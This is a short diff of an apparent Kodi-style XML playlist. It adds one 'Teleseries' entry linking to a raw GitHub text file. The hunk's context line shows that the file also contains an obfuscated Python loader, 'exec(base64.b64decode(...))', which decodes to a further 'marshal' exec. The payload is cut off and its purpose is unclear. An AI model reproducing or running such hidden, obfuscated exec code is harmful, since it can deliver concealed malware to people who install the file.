@@ -430,6 +430,17 @@ import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWR
 <fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
 </item>
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ <item> 
+<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Teleseries[/COLOR]</title> 
+<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/teleseries.txt</externallink> 
+<link>na</link> 
+<thumbnail>https://i.imgur.com/vkbwOMp.png</thumbnail>
+<fanart>https://i.imgur.com/i6rVUIV.jpg</fanart>
+</item>
+ 
+ ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
 <!--
 <item>
 <title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Made in Spain[/COLOR]</title>
